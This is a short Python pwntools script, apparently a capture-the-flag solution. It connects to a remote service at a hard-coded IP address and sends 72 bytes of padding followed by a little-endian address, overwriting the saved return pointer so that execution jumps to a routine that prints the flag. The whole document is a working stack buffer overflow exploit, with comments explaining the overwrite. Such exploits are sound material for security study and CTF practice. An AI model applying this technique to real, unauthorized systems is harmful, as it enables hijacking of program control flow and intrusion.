from pwn import *


r = remote("13.232.34.171", 32644)
r.recvuntil(b"return.")

addr = 0x401196
addr_repr = addr.to_bytes(8, "little")

# Fill the array and the stored rbp register value with padding data.
# Overwrite the saved rip register with the address of the subroutine that prints the flag.
r.send(b"A" * (0x40 + 8) + addr_repr + b"\n")
print(r.recvall())
